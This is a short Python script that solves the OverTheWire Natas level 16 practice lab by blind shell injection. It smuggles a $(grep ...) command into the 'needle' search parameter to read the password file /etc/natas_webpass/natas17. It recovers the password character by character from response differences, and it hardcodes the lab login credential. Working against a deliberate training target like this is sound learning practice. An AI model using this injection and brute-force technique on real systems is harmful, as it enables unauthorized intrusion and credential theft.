# Blind Shell Injection
import requests # allows you to send HTTP requests using Python.
import string

# Store password here
natas17password = ""

# add all the characters needed
charset = (string.digits + string.ascii_letters)

print("Running...\n")

while len(natas17password)<32:
  for char in charset:
    grepVariable = natas17password + char

    natasParam = "$(grep ^%s /etc/natas_webpass/natas17)apple" % grepVariable

    r = requests.get(
      'http://natas16.natas.labs.overthewire.org',
      auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),params={'needle': natasParam}
    )

    if "apple" not in r.text:
      natas17password = grepVariable
      print(natas17password)
      continue

print("\nFinal: %s" % natas17password)

# Alternate Method, use this as url: 'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+%5E'+grepVariable+'+%2Fetc%2Fnatas_webpass%2Fnatas17%29apple&submit=Search'

